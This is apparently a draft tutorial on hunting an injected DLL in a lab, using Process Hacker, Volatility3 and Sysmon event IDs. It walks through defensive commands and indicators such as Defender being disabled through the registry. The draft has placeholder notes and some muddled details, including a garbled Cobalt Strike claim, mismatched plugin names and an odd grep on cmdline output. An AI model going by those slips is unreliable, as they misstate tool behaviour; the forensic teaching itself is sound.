# PART 3: Live Memory Analysis

# THEORY








For LOG ANALYSIS intro:
- mention this one usualyl more realm of SOC/SIEM and not Forensics, which usually more focus of threat hutning.
- Likely one of the thoughts underpinning this attitude is that logs are grunt-work, mountains of nothing that needs to be sifted through, mountains so huge its completly beyond the scope of humams, and so SIEMs not only CAN do it, but are better than humans in it. 

- but that is true for the general appraco to logs. But what we are speaking of here is a much specific way of looking at logs - limitiing the type of logs we look at. Additioarnlly, logs depending on the PHASE. See below - logs might not be a great place to start in Phase 1, but for example can be perfect for Phase 2. Sicne you already more or less know what you are looking for, makes the volume manageable, esp considering we're likely only interested in Sysmon, Powershell, and a highly select WEL IDs. 


ULTIMATELY, Phase 1 should focus on where they cannot hide - meaning memory and packets. Every where else, disk, logs, etc they can hide. but they can never hide from memory/packets = memory when they are at rest/use, packets when they are in transit. 


Ok so now as we go ahead, remember we have no idea of the attack, we don't know a DLL injected attack has happened, since that was "evil ash" doing it. Meaning we are in Phase 1, and then thios I might not mention but for own sanity - at end of live analysis II (PE Hacker), we can then switch over to Phase II.

WHY MEMORY?
and finally we'll also look at memory foresnics: for some reason a lot fo thought is still stuck in malware paradignms for a decade ago looking at discs. but almost all modern malware won't even exists on the disk, they live in memory and their proably followign a "living off the land" approach in that they use local processes and services to handle all the mischief. so we'll create a dump with something like dumpit! and then we'll use volatitliy

Open Process Hacker as admin - ie right-click and select `Run as administrator`. Scroll down until you see `rufus.exe` (or whatever other legitimate process you chose to inject into). We can now look at our 7 signs.

1. Parent-Child relationships

{{< figure src="/img/image053.png" title="" class="custom-figure" >}}

- TBH even though I said there is no silver bullet, nothing that can lead to 100% certainty, this first sign is HIGHLY SUSPECT. Why?
- Well first off we can see `rufus`, and then that it itself spawned `rundll32.exe`.
- There's two things suspect about this. 
- First, we know that `rundll32.exe` is legitimate Windows process used to launch DLLs. But, since we also know that `rufus` is used to create bootable USB drives we have to ask ourselves: why on earth would this need to run `rundll32.exe`? Logically it makes no sense, and if we Google for example `rufus.exe spawn rundll32.exe` and there are no clean hits, well it certainly raises suspicion.
- Further, `rundll32.exe` itself is often invovled in malware for a number of reasons - it can be used to execute malicious code concealed in a DLL, it can be used for persistence by associating itself with a DLL and a commonly-called function, and `rundll32.exe` can be misused to initiate or maintain communication with the C2 server. 
- Further it is also very often associated with the most popular C2 framework for advanced groups - `Cobalt Strike`. Why? Simply because Raphael Mudge, the creator of the Cobalt Strike, decided to name the default dll spawned by `rundll32.exe`. Though this can be renamed in the Cobalt Strike config, it turns out, perhaps somewhat surprisingly; that most hackers don't do this. So more than 50% if Cobalt Strike is present on your system you'd expect to see `rundll32.exe`.
- All this to say: it's sus to see `rufus` spawning `rundll32.exe`, the fact that it is itself `rundll32.exe` is even more sus, but HOLY SMOKES the most sketchy thing of all is what we see in the next relationship - `rundll32.exe` spawning `cmd.exe`.
- I just said before that `rundll32.exe` is typically used to launch DLLs. Thus there is **very** little reason for us to expect it to be spawning the Windows command line interpreter `cmd.exe`. Now it could be that some amateur developer wrote some janky code that does this as some workaround, but in honesty if you see this you should get ready to dig in deeper. So let's do that by double-clicking on `rundll32.exe` to bring up its properties.

2. Signature - is it valid + who signed?

{{< figure src="/img/image054.png" title="" class="custom-figure" >}}

- We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of rundll32.exe.

3. Current directory
- On the same image we can see the **Current directory**, that is the "working directory" of the process, which is the directory where the process was started from or where it is operating.
- We can see here that the Current directory is the Desktop since that's where it was initiated from. 
- Now this could happen with legitimate scripts or applications that are using rundll32.exe to call a DLL function.
- However, seeing rundll32.exe being called from an unusual location like a user's desktop could be suspicious, particularly if it's coupled with other strange behavior. 

4. Command-line arguments 
- And again in reference to the same image once more we see that the **Command-line** is `rundll32.exe`. 
- This is actually very unusual - the `rundll32.exe`` command is typically used to execute a function in a specific DLL file, and thus, you would normally see it accompanied by arguments specifying the DLL file and function it's supposed to execute. 
- For example, a legitimate command might look something like this: `rundll32.exe shell32.dll,Control_RunDLL`.
- Thus it being "nude" can certainly be seen as another point for Team Suspect.

5. Thread Start Address
- In the top of the Properties window select `Threads`.
{{< figure src="/img/image055.png" title="" class="custom-figure" >}}
- We can see under `Start address` that it is mapped, meaning it does exist on disk.
- So this just tells us that this is not a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as `0x0`.

6. Memory Permissions
- In the top of the Properties window select `Memory`.
- Now click once on the `Protection` header to sort it. 
- Scroll down until you see `RWX` permissions, that is of course if it exists.
{{< figure src="/img/image056.png" title="" class="custom-figure" >}}
- And indeed we see the presence of two memory spaces with **Read-Write-Execute** permissions, which as we learned is always unusual/suspect.

7. Memory Content
- Finally let's double-click on the larger of the two (172 kB) since this typically represents the payload.
{{< figure src="/img/image057.png" title="" class="custom-figure" >}}
- And immediately we can see two clear giveaways that we are dealing with a PE file: first we see the magic bytes (`MZ`), and we see the strings we associate with a PE Dos Stub - `This program cannot be run in DOS mode`.
- So once again it seems suspect. 

That's it for our live analysis: feel free to exit Process Hacker. Let's discuss our results before dumping the memory and moving on to our post-mortem analysis. 

ANALYSIS
add a table here
review results, conclusions we can come to, next steps etc.

**Memory Dump**


Feel free to shut down the Kali VM - this will of course kill the connection but for now that's not an issue since we have everything we need: a memory dump, a traffic packet capture, and logs (WEL, PowerShell, Sysmon). 

***

# PART 4: Post-Mortem Memory Analysis

First thing's first - we need to transfer all our artifacts over from the Windows VM to our Ubuntu analyst VM. There are a number of ways to do this, and if you have your own method you prefer please do go ahead. I'm going to install python3 so we can quickly spin up a simply http server and transfer it that way.

But before we do that, let's aggregate all our data.
1. (opt) For simplicity I am going to create a new folder on the desktop called `artifacts`.
2. Copy your pcap (traffic packet capture) into it, in my case it's `dllattack.pcap` located on the desktop.
3. Then copy your memory dump into the same folder, in my case again it was saved to desktop as `memdump.raw`.
4. Now we'll need to copy the logs over, first we'll do the WEL logs. Open an administrative PowerShell terminal and run the following command:

```
Copy-Item -Path "C:\Windows\System32\winevt\Logs\System.evtx","C:\Windows\System32\winevt\Logs\Application.evtx","C:\Windows\System32\winevt\Logs\Security.evtx" -Destination "C:\Users\User\Desktop\artifacts"
```
5. Now we'll do the Sysmon logs, for this we'll need to convert it into an .evtx file wherafter we can save it directly in our `artifacts` directory. 

```
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\artifacts\Sysmon.evtx"
```
6. Finally we'll do the same for the PowerShell Script Block Logs.
```
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\artifacts\PowerShell.evtx"
```

Great so in your `artifacts` folder you should now have the following itesms - see image below.

{{< figure src="/img/image060.png" title="" class="custom-figure" >}}

We're now ready to transfer the files over.
1. First download the Python3 installer [here](https://www.python.org/downloads/windows/). 
2. Then simply run the installer, all default selections.
3. Once it's done open an administrative `Command Prompt` and navigate to the `artifacts` folder.
4. We can now spawn our **http server**.
```
python -m http.server 8008
```
5. You will more than likely receive a Windows Security Alert, click Allow Access.

{{< figure src="/img/image058.png" title="" class="custom-figure" >}}
6. Now head on over to your Ubuntu analyst VM and open the browser (FireFox). Navigate to `http://[windows_IP]:8008`, in my case that would be `http://192.168.230.158:8008`.

{{< figure src="/img/image061.png" title="" class="custom-figure" >}}

7. Now you can simply go ahead and save each of the files to wherever you want - for simplicity's sake I will be saving them all directly to the desktop in another folder called `artifacts`.

Now that we have all the data on the analyst system we're free to start analysis. Note you are free to close the Windows VM, for the rest of the course we'll only be using the Ubuntu VM.

We'll now start our Post-Mortem Memory Analysis, but in case you are interested here is a short little overview of the tool we'll be working with, Volatility. 

# VOLATILITY THEORY
Volatility is an open-source memory forensics framework used to extract digital artifacts from volatile memory (RAM) dumps. It's developed in Python and allows us to investigate potential malicious activity by looking processes, network connections and much, much more.

It takes a sort of modular approach where you use different plug-ins (seperate `.py` scripts) to perform specific tasks - for example `pslist` gives us an overview of processes while `netstat` gives us statistics about network connections. There are a few dozen such plug-ins and you can either write your own.  

For this course we'll be exploring the following 6 and I strongly encourage you to explore others to become more familiar with this great tool.
- pslist
- handles
- cmdline
- netscan
- malfind

# ANALYSIS WITH VOLATILITY
**pslist**
Two of the most common/popular plugs-ins are `pslist` and `pstree`. The former gives us a list of all processes including some key details, `pstree` conversely will also show Parent-Child relationships.

We won't go into these plug-ins very deep right now because, in essence, we already gleamed most of the insights it has to offer during our live analysis. But it is good to be aware, if for whatever reason you were not able to perform the live analysis but did come in possession of the memory dump, then effectively you can through a perhaps somewhat more convoluted manner arrive at the same insights. 

I will however quickly run `psinfo` below just so we get the PID of our suspicious process, we'll use that with other plug-ins. 

1. Open a terminal and navigate your your main Volatility3 directory, in my case it is `/home/analyst/Desktop/volatility3`.
2. Let's run our `psinfo` plugin using the following command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.pslist 
```
3. Scroll down until you see `rundll32.exe` and note it's PID, you can see in my example below it's `5060`, we'll use this for our next plug-in. 

{{< figure src="/img/image062.png" title="" class="custom-figure" >}}

**handles**
Now that we've got the PID of our suspicious program we're going to look at its handles. 

A handle is like a reference that a program uses to access a resource - whether that be files, registry keys, or network connections. When a process wants to access one of these resources, the operating system gives it a handle, kind of like a ticket, that the process uses to read from or write to the resource.

For threat hunting it's a great idea to look at the handles of any process you consider suspect since it will give you a lot of information about what a process is actually doing. For instance, if a process has a handle to a sensitive file or network connection that it shouldn't have access to, it could be a sign of malicious activity. By examining the handles, we can get a clearer picture of what the suspicious process is up to, helping you understand its purpose and potentially identify the nature of the threat.

Now to be frank this analysis of handles can be a rather complex endeavour, relying on a deep techincal understanding of the subject. So I'll show how it works, and of course provide some insight on the findings, but be aware that I won't be able to do an exhaustive exploration of this topic as that could be a multi-hour course in and of itself. 

So let's run the `windows.handles` plugin with the following command, including the PID of `rundll32.exe` as we just learned. 
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060
``` 

We see a large number of output, too much to meaningfully process right now. However what immediately sticks out is `Key` - meaning registry keys. So let's run the same search but utilize `grep` to only see all handles to registry keys:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060 | grep Key
``` 
We can see all the results in the image below:

{{< figure src="/img/image063.png" title="" class="custom-figure" >}}

Again, as has been the case before: nothing here is inherently indicative of malware. However, in the case where we suspect something of being malware, many of these registry key handles are commonly absed by malware. 

`MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS`: 
This key is commonly used to debug applications in Windows. However, it is also used by some malware to intercept the execution of programs. Malware can create a debugger entry for a certain program, and then reroute its execution to a malicious program instead.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS`: This key is related to National Language Support (NLS) and the sorting of strings in various languages. It's uncommon for applications to directly interact with these keys. If the process is modifying this key, it may be an attempt to affect system behavior or mask its activity.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\HWORDER and MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\PROVIDERORDER`: These keys are related to the order in which network providers are accessed in Windows. Modification of these keys may indicate an attempt to intercept or manipulate network connections.

`MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9 and MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\NAMESPACE_CATALOG5`: These keys are related to the Winsock API, which is used by applications to communicate over a network. If the process is interacting with these keys, it could be trying to manipulate network communication, which is a common tactic of malware.

=============================
**cmdline**

The `cmdline` is another useful plug-in I'm mentioning because I wanted you to be aware of it, even though we won't learn anything new from it in this specific case. Running the command below we'll see a history of all the command prompt, inlcuding `rundll32.exe`. So again we learn here, as we did in the live analysis, that it ran without any expected arguments. In the case a live analysis was not feasible, we'd once again be able to attain that same insight here in the post-mortem analysis. 

```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.cmdline.CmdLine --pid 5060 | grep Key
``` 

**netscan**
The `netscan` plugin will scan the memory dump looking for any network connections and sockets made by the OS.

You can run the scan using the following command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.netscan
```

Right now I'll defer comment, since we're going to jump into network connections DEEPLY in PART X with `Wireshark`, `Zeek`, and `RITA`. I just wanted you to be aware that you can also use a memory dump to look at network connections if for some reason you don't have a packet capture available.   

**malfind**
`malfind` is the quintessential plugin for, well, finding malware. The plugin will look for suspected inject code, which it determines based on header info - much indeed like we did during our live analysis in steps 6 and 7. 

We can run it with:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.malfind
```
Below is a sample of the result, which is quite extensive:

{{< figure src="/img/image064.png" title="" class="custom-figure" >}}

We can see that it correctly flagged `rundll32.exe`. However, if we go through the entire list we can see a number of false positives: 
- RuntimeBroker.exe
- SearchApp.exe
- powershell.exe
- smartscreen.exe

This is thus a good reminder that the mere appearance of a process in malfind's output is not an unequivocal affirmation of its malicious nature.

**Closing Thoughts**
This section was admitrtedly not all-too revelatory. But that's really because we have already performed live analysis, and thus we can say the point of performing post-mortem analysis is really:
- to strengthen the case/conviction of suspicious malware identified during live analysis, or
- in the case that live analysis was unfeasible, much of the same data/insights could be obtained here with Volatility3.

I think this a good introduction to Volatility3, though we could obviously go much deeper I'll leave that for our next course. 

SO for now let's jump straight into log analysis with an emphasis on UEBA.

reference
https://www.youtube.com/watch?v=cYphLiySAC4

***

# PART X: LOG ANALYSIS 

Time for us to get into some LOGGING...

{{< figure src="/img/lumberjack.gif" title="" class="custom-figure" >}}

No, not that kinda logging.

The kind which, admittedly, is not too exicting. 

Here let's touch on some regular logging. 



# SYSMON
- we clear log, show amount
- we run attacka gain real quick
- we expoort attack as evtv

Now as we can see below, after we've performed the attack we now have 34 total event logs, meaning that in total 32 resulted from our actions since clearing the log. Note that yours should be more-or-less the same, however it could definitely have a couple of events more/less. 

{{< figure src="/img/image066.png" title="" class="custom-figure" >}}

We can also immediately observe there are a number of distinct Event IDs - `1, 3, 5, 10, 12, 13 and 22`.

Here is a short description of these 7 event IDs we encounter in our dataset. Feel free to review them now, or refer back to them as we discuss each individual event. 

`Event ID 1 (Process Creation)`: The process creation event logs when a process starts, and it provides data with the process, parent process, and the user and group information. It also records the process image file hash.

`Event ID 3 (Network Connection)`: This event logs TCP/IP connections, and it records the process that made the connection, the destination IP, hostname and port.

`Event ID 5 (Process Terminated)`: Logs when a process exits, providing data about the process image file.

`Event ID 10 (ProcessAccess)`: This event logs when a process opens another process, often indicating debugging or injection activity. It reports the source and target process, and the granted access.

`Event ID 12 (Registry Event (Object Create and Delete))`: Logs when a registry object is created or deleted.

`Event ID 13 (Registry Event (Value Set))`: Logs when a value is set for a Registry object, which often indicates changes to system configuration.

`Event ID 22 (DNS Query)`: This event logs when a process conducts a DNS query, providing information about the process and the DNS query.

- the first two represent us clearing the log
- 3 + 4 accessing processes windows doing its thing

now 5th one is the dns query, here is where things start getting interesting
this one is related to our IEX command - since it needs to go to a FQDN (raw.githubusercontent.com), it needs to use DNS.

{{< figure src="/img/image067.png" title="" class="custom-figure" >}}

6 is then establishing a network connection (ID 3), obvs sicne we just ran DNS we get the IP, establish a connection with the server hosting the script

{{< figure src="/img/image068.png" title="" class="custom-figure" >}}

7 is smartscreen

8 is explorer opening rufus, 9 is rufus closing, 10 is consent.exe, 11 again rufus opening

12 is vdsldr.exe, 13 is lsass, so is 14, 15 is vds.exe, 

16 is a big one = 13 (Registry value set)
we can see rufus is changing a registru

{{< figure src="/img/image069.png" title="" class="custom-figure" >}}

This registry key appears to be related to the Windows Defender's Group Policy settings. More specifically, the "DisableAntiSpyware" at the end suggests that this policy might control whether the anti-spyware component of Windows Defender is enabled or disabled.

Breaking down the registry key:

- "HKU" stands for HKEY_USERS, which contains the configuration data for all the user profiles on the computer.

- "S-1-5-21-3300832437-63900680-1611145449-1001" is the Security Identifier (SID) for a specific user account on the system.

- "SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy Objects" is where Group Policy Objects settings are stored.

- "{F1BFD3AE-2A88-41A2-989E-39817E08E286}Machine" identifies a specific Group Policy Object.

- "Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware" points to the policy controlling the anti-spyware feature of Windows Defender.

The Sysmon event ID 13 is associated with Registry Value Set operations. If you are seeing this in a Sysmon event, it suggests that this registry key value was modified. 

If the value of "DisableAntiSpyware" is set to 1, it means that the anti-spyware component of Windows Defender has been disabled for the user associated with the SID. If it's 0, then the feature is enabled. 

Please note that modifying this value could have significant security implications, as it would disable part of the built-in protection of the Windows system. If this change was not intended, it might be a sign of a security breach or malware attempting to lower system defenses.

The "Details DWORD (0x00000001)" indicates that the value of the registry key was set to "1". In the context of the "DisableAntiSpyware" key, this means that the anti-spyware component of Windows Defender has been disabled for the user account associated with the given Security Identifier (SID). 

It's also worth noting that this operation seems to be associated with the "rufus-4.1_x86.exe" executable, which is a utility used to create bootable USB drives. It's unusual for such a utility to interact with Windows Defender settings in this way. If this activity was not expected or initiated by a trusted user, it could potentially indicate a security issue, such as a breach or malware activity.

So this might suggest to us that when the script ran in dll injected into rufus, one of the very first thing it does is change this registry key to deactivate the feature, likely in an attempt to avoid detection

Alos observer around 2:04:38 everything happening at same time - moment injetion occurred

this then follows with 12 and 13, could be that svchost is trying to fix things again?
- will need to follow up and ask ChatGPT now being a moron

we then see a whole host of 10 - svchost, lsass - no need to worry about that for now

we then enter into event IDs 1 - a number of process creations.
all related to taskhostw.exe
for ex svchost.exe -k netsvcs -p
svchost.exe: This is the Service Host process, which is used to host multiple Windows operating system services. Each svchost.exe instance can run one or more services, and Windows uses multiple instances of svchost.exe to separate different services from each other.

-k: This flag is used to specify the service group that this instance of svchost.exe will host. In this case, the group is netsvcs, which is a group of important network-related services in Windows.

then ffwd to the end, the final event log is process creation of rundll32.exe

{{< figure src="/img/image070.png" title="" class="custom-figure" >}}

let's see here if imphash has any hits?
no result for MD5 on VT, but yes on joesandbox

====================